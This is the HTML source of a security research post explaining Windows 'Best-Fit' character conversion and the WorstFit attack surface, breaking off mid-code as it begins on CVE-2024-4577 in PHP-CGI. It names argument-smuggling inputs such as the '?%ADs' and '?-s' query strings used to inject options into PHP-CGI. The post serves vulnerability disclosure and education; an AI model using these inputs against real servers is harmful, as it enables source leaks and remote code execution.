&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;#outline&quot;&gt;Outline&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit â€“ The novel attack surface on Windows&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;ğŸ”¥ The nightmare of East-Asia - CVE-2024-4577&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-filename-smuggling&quot;&gt;ğŸ”¥ Filename Smuggling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-argument-splitting&quot;&gt;ğŸ”¥ Argument Splitting&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-environment-variable-confusion&quot;&gt;ğŸ”¥ Environment Variable Confusion&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#the-duskor-dawnof-the-worstfit&quot;&gt;The Duskâ€“or Dawnâ€“of the WorstFit&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#epilogue&quot;&gt;Epilogue&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#mitigations&quot;&gt;Mitigations&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/h2&gt;

&lt;p&gt;If you are a Windows user, youâ€™re probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis âœ…, Ã¡ccÃ¨nted letters, ğ’»ğ’¶ğ“ƒğ’¸ğ“ ğ•¤ğ•ªğ•ğ•“ğ• ğ•ğ•¤ and CJK &lt;abbr title=&quot;CHARACTERS&quot;&gt;åŒšå„å…«å°ºå…«åŒšã„’ãƒ¨å°ºä¸‚&lt;/abbr&gt; pretty much anywhere â€” like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?&lt;/p&gt;

&lt;p&gt;Well, to describe this, letâ€™s dive into the history of encoding in Windows first to understand how it handles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/h3&gt;

&lt;p&gt;Windows initially used ANSI encoding, which relied on code pages such as the one shown below. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Code Page&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Language&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1250&lt;/td&gt;
      &lt;td&gt;Central / Eastern European languages (e.g., Polish, Czech)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1251&lt;/td&gt;
      &lt;td&gt;Cyrillic-based languages (e.g., Russian, Bulgarian)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1252&lt;/td&gt;
      &lt;td&gt;Western European languages (e.g., English, German, French)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1253&lt;/td&gt;
      &lt;td&gt;Greek&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1254&lt;/td&gt;
      &lt;td&gt;Turkish&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1255&lt;/td&gt;
      &lt;td&gt;Hebrew&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1256&lt;/td&gt;
      &lt;td&gt;Arabic&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1257&lt;/td&gt;
      &lt;td&gt;Baltic languages (e.g., Estonian, Latvian, Lithuanian)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1258&lt;/td&gt;
      &lt;td&gt;Vietnamese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;932&lt;/td&gt;
      &lt;td&gt;Japanese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;936&lt;/td&gt;
      &lt;td&gt;Simplified Chinese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;949&lt;/td&gt;
      &lt;td&gt;Korean&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;950&lt;/td&gt;
      &lt;td&gt;Traditional Chinese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;874&lt;/td&gt;
      &lt;td&gt;Thai&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;For instance, back in the day, as a Taiwanese, if my Japanese friend sent me an article written on their Windows computer, Iâ€™d probably end up with a scrambled mess of &lt;a href=&quot;https://en.wikipedia.org/wiki/Mojibake&quot;&gt;mojibake&lt;/a&gt; because my code page 950 system couldnâ€™t properly interpret the Japanese 932 code page.&lt;/p&gt;

&lt;p&gt;To handle different encoding needs, Windows doesnâ€™t rely on just one type of code page â€” there are actually two:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ACP&lt;/strong&gt; (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables. Our research here primarily focuses on this type of code page, as it significantly impacts the scenarios weâ€™ll examine.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;OEMCP&lt;/strong&gt; (Original Equipment Manufacturer Code Page): Mainly used for device communication, such as reading or writing to the console.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To check which ACP (ANSI code page) youâ€™re using, consider these methods:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Using PowerShell&lt;/strong&gt;
    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OutputEncoding.WindowsCodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;From the Registry&lt;/strong&gt;
    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Additionally, you might also heard of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt;&lt;/a&gt;. However, be aware that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt; displays the &lt;strong&gt;OEMCP&lt;/strong&gt;  rather than the ACP, which is the focus of our research here.&lt;/p&gt;

&lt;h3 id=&quot;the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/h3&gt;
&lt;p&gt;To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.&lt;/p&gt;

&lt;p&gt;Initially, Windows used UCS-2 for Unicode but soon upgraded to &lt;strong&gt;UTF-16&lt;/strong&gt;, which uses 16 bits for most characters and expands to 32 bits for rarer ones (e.g., emojis, ancient scripts). Windows also switched to &lt;strong&gt;wide characters&lt;/strong&gt; for core APIs like file systems, system information, and text processing.&lt;/p&gt;

&lt;p&gt;Now you might be wondering: Hey, what about the most popular Unicode encoding nowadays: &lt;strong&gt;UTF-8&lt;/strong&gt;? Well, itâ€™s already there, but still in a sort of beta phase. For most languages, the UTF-8 feature sadly isnâ€™t enabled by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/h3&gt;

&lt;p&gt;Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ANSI APIs&lt;/strong&gt;: A Windows code page version with the letter â€œAâ€ postfix used to indicate â€œANSIâ€. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Unicode APIs&lt;/strong&gt;: A Unicode version with the letter â€œWâ€ postfix used to indicate â€œwide (character)â€. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This approach allows developers to easily obtain their desired data format by simply switching between the A-postfix and W-postfix APIs.&lt;/p&gt;

&lt;p&gt;It sounds perfect â€“ But wait, so how can a wide character UTF-16 string also be in the ANSI format? Arenâ€™t they fundamentally different?&lt;/p&gt;

&lt;p&gt;To illustrate this, letâ€™s explore an example. Imagine weâ€™re on an English (&lt;strong&gt;Windows-1252&lt;/strong&gt; code page) system with an environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENV=Hello&lt;/code&gt; stored in the system. The data is internally stored as &lt;strong&gt;UTF-16&lt;/strong&gt; (wide character format), but we can retrieve it using both Unicode and ANSI APIs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; â­¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4800 6500 6C00 6C00 6F00&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; â€” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; â­¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;48 65 6C 6C 6F&lt;/code&gt; in ANSI).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the &lt;strong&gt;Unicode API&lt;/strong&gt;, thereâ€™s no problemâ€”Unicode in, Unicode out, with no conversion needed. For the &lt;strong&gt;ANSI API&lt;/strong&gt;, Windows applies an implicit conversion by calling &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt;&lt;/a&gt; (or sometimes &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WideCharToMultiByte&lt;/code&gt;&lt;/a&gt;) to convert the original Unicode string to an ANSI string. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; consists only of ASCII characters, everything works perfectly and as expected.&lt;/p&gt;

&lt;p&gt;But what happens if the environment variable contains a more complex string, like &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;âˆšÏ€â·â‰¤âˆ&lt;/code&gt;&lt;/strong&gt;, with a lot of non-ASCII characters?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; â­¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;âˆšÏ€â·â‰¤âˆ&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1a22 c003 7720 6422 1e22&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;strong&gt;Unicode API&lt;/strong&gt; correctly returns the original string as we expected.&lt;/p&gt;

&lt;p&gt;Now, what happens with the ANSI API? Are you able to guess the result?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; â€” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; â­¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76 70 37 3D 38&lt;/code&gt; in ANSI) ğŸ¤¯&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yep, the output is &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vp7=8&lt;/code&gt;&lt;/strong&gt;. A strange result, right? I guess you canâ€™t even figure out the connection between the original characters and their character codes!&lt;/p&gt;

&lt;p&gt;This bizarre transformation is whatâ€™s known as &lt;strong&gt;â€œBest-Fitâ€&lt;/strong&gt; behavior. As a result, the original string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;âˆšÏ€â·â‰¤âˆ&lt;/code&gt; transforms into a nonsensical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt;. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.&lt;/p&gt;

&lt;p&gt;And actually, itâ€™s not just when using Windows APIs directly â€” this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getenv&lt;/code&gt;&lt;/a&gt;. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function like:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The same Best-Fit behavior applies to both the arguments and the environment variables. Hereâ€™s what happens when we run this code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This happens because, during compilation, the compiler inserts several functions and links the CRT DLLs for you, which internally rely on ANSI Windows APIs. As a result, the same Best-Fit behavior is triggered implicitly.&lt;/p&gt;

&lt;p&gt;We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/h2&gt;

&lt;p&gt;In Windows, â€œBest-Fitâ€ character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesnâ€™t exist in the target code page.&lt;/p&gt;

&lt;p&gt;For instance, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;âˆ&lt;/code&gt; (&lt;a href=&quot;https://www.compart.com/en/unicode/U+221E&quot;&gt;U+221E&lt;/a&gt;) symbol isnâ€™t part of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout&quot;&gt;Windows-1252 code page&lt;/a&gt;, so Microsoft decided to map it to the â€œ&lt;strong&gt;closest&lt;/strong&gt;â€ characterâ€”&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt; (&lt;a href=&quot;https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e&quot;&gt;ğŸ”&lt;/a&gt;). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different thingsâ€¦&lt;/p&gt;

&lt;p&gt;Anyway, obviously thereâ€™s no strict formula for Best-Fit mapping â€“ what Microsoft does is more about making characters look, or even â€œfeelâ€ somewhat alike.&lt;/p&gt;

&lt;p&gt;Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) is mapped to a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;) on the Japanese (932) code page, to a â€œYâ€ on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.&lt;/p&gt;

&lt;p&gt;If youâ€™re curious about the specifics, you can check out our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool or dive into the raw mapping data on &lt;a href=&quot;https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt&quot;&gt;Unicode.org&lt;/a&gt; by yourself.&lt;/p&gt;

&lt;p&gt;Interestingly, during our research we found that this &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior was already mentioned back in Black Hat USA 2009 during Chris Weberâ€™s presentation, &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf&quot;&gt;â€œUnicode Securityâ€&lt;/a&gt;. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(&lt;strong&gt;Updated&lt;/strong&gt;: After this article was published, we learned that &lt;a href=&quot;https://x.com/hasegawayosuke&quot;&gt;Yosuke HASEGAWA&lt;/a&gt; also mentioned this behavior at &lt;a href=&quot;https://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Hasegawa/BlackHat-japan-08-Hasegawa-Char-Encoding.pdf&quot;&gt;Black Hat Japan 2008&lt;/a&gt;, covering part of our Filename Smuggling in Japanese code page.)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;But this time, weâ€™re taking big steps forward â€“ showing how those sneaky Best-Fit conversions can operate on a &lt;strong&gt;system-wide level&lt;/strong&gt;, leading to even more impactful exploits, all unfolding right under your nose.&lt;/p&gt;

&lt;p&gt;Now, itâ€™s time to turn this quirky behaviour into something more impactful: &lt;strong&gt;real WorstFit vulnerabilities&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit â€“ The novel attack surface on Windows&lt;/h2&gt;

&lt;p&gt;By delving into the Best-Fit feature, we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, weâ€™ll explore three intriguing attack techniques that exploit this behavior: &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt; and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Letâ€™s dive into each of these techniques to see how this seemingly thoughtful (at least, from Microsoftâ€™s perspective at the time) feature can lead to critical vulnerabilities!&lt;/p&gt;

&lt;h3 id=&quot;-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;ğŸ”¥ The nightmare of East-Asia - CVE-2024-4577:&lt;/h3&gt;

&lt;p&gt;The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; request!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;shy;&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00AD&quot;&gt;U+00AD&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward â€“ argument injection. By appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?-s&lt;/code&gt; to a request, attackers could leak the pageâ€™s source code. Furthermore, itâ€™s also possible to achieve Remote Code Execution (RCE).&lt;/p&gt;

&lt;p&gt;Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;QUERY_STRING&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span 